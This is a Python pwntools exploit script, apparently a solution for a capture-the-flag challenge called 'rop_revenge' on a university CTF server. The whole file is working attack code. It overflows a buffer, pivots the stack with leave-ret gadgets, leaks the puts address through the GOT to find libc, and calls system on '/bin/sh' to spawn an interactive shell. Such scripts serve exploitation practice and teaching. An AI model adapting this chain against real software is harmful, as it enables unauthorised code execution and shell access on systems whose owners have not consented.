from pwn import *
context.arch = "amd64"
context.terminal = "bash"

host, port = 'ctf.adl.csie.ncu.edu.tw', 11009
#p = remote(host, port)
p = process('./rop_revenge')
#gdb.attach(p)

overflow = "a"*(0x28-8)
buf1 = 0x601080
buf2 = buf1 + 0x300
buf3 = buf2 + 0x300
puts_plt = 0x400500
puts_got = 0x601018
read_plt = 0x400520
pop_rdi = 0x400743
leave_ret = 0x4006d4
pop_rsi_r15 = 0x400741

# 1
rop = flat([
    buf2,
    pop_rdi, 0, pop_rsi_r15, buf3, 0, read_plt,
    pop_rsi_r15, 0, 0,
    pop_rdi, puts_got, puts_plt,
    pop_rdi, 0, pop_rsi_r15, buf2, 0, read_plt,
    leave_ret
])
p.recvuntil("What your name?")
p.send(rop)

# 2
rop2 = flat([
    buf1, leave_ret
])
p.recvuntil("What do you want to say?")
p.send(overflow + rop2)
p.recvuntil("Only one gadget, Hacker go away~")

# 3
p.send('/bin/sh\x00')

# Get libc
p.recvuntil("\n")
l = p.recvuntil("\n")
print( [hex(ord(c)) for c in l ] ), "\nstr:",repr(l), "len():",len(l)
puts = u64(l.strip().ljust(8, "\x00"))
libc = puts - 0x6f5d0
system = libc + 0x45380
binsh_addr = libc + 0x18C58B
print "puts:", hex(puts)
print "libc:", hex(libc)
print "system:", hex(system)
print "binsh_addr:", hex(binsh_addr)

# 4
rop3 = flat([
    buf1,
    pop_rdi, buf3, system,
    #pop_rdi, binsh_addr, system,
    #pop_rdi, buf2+4*8, system, '/bin/sh\x00',
])
p.send(rop3)
p.interactive()
